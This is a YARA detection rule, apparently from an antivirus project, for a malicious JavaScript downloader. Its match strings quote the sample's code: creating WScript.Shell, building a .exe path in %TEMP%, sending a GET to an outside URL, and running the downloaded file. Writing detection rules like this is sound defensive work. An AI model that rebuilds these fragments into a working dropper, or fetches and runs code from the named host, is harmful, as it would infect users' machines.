rule sig_20160329_30bb568260d2aa286ad778a5924a3910 {
  meta:
    description = "datamaliciousorder - file 20160329_30bb568260d2aa286ad778a5924a3910.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "241c18105282290ce2f58ac7b9ed397cd0a17ddb9a742e454657d3645b3c171e"

  strings:
    $s1  = "function xc() {return i[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"WYsfGfgFEyNXmvd.exe\";};" fullword ascii
    $s2  = "for (;;){WScript[R](A() * 11); if (g0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "var i = function d() {return WScript[a](\"WScript.Shell\");}(), j = 11;" fullword ascii
    $s4  = "function AW(i0, Xl){al = al * 1; return i0 - Xl;};" fullword ascii
    $s5  = "g0[G](\"GET\", \"http://kingsstaging.consines.in/l9osaw\", false);" fullword ascii
    $s6  = "function g(){return \"\" + F;};" fullword ascii
    $s7  = "function S() {return ((hV == true) && (hV == jT)) ? 1 : al;};" fullword ascii
    $s8  = "function z(Z0){i[\"Run\"](Z0, al, al);};" fullword ascii
    $s9  = "var t = new this[\"Date\"]();" fullword ascii
    $s10 = "function Ee()" fullword ascii
    $s11 = "function P(){return a;};" fullword ascii
    $s12 = "return AW(dH, Vd);" fullword ascii
    $s13 = " while (N){" fullword ascii
    $s14 = "function bT(B) {var Zn = (1, 2, 3, 4, 5, B); return Zn;};" fullword ascii
    $s15 = "function A(){return 22;};" fullword ascii
    $s16 = "hV = true; " fullword ascii
    $s17 = "var jT = false;" fullword ascii
    $s18 = "var FK = false;" fullword ascii
    $s19 = "jT = true; " fullword ascii
    $s20 = "var hV = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}